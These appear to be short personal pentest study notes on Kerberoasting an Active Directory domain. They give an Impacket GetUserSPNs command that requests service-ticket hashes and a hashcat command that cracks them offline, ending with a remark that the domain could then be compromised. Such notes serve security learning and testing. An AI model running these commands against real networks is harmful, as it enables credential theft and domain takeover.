  
![[/Untitled 23.png|Untitled 23.png]]
  
Step 1: Get SPNs, Dump Hash
- python GetUserSPNs.py <DOMAIN/username:password> -dc-ip <ip of DC> -request
![[/Untitled 1 10.png|Untitled 1 10.png]]
Step 2: Crack that hash
- hashcat -m 13100 kerberoast.txt rockyou.txt
- when grabbing the hash, grab the ENTIRE string
![[/Untitled 2 10.png|Untitled 2 10.png]]
![[/Untitled 3 8.png|Untitled 3 8.png]]
at this point, we could compromise the domain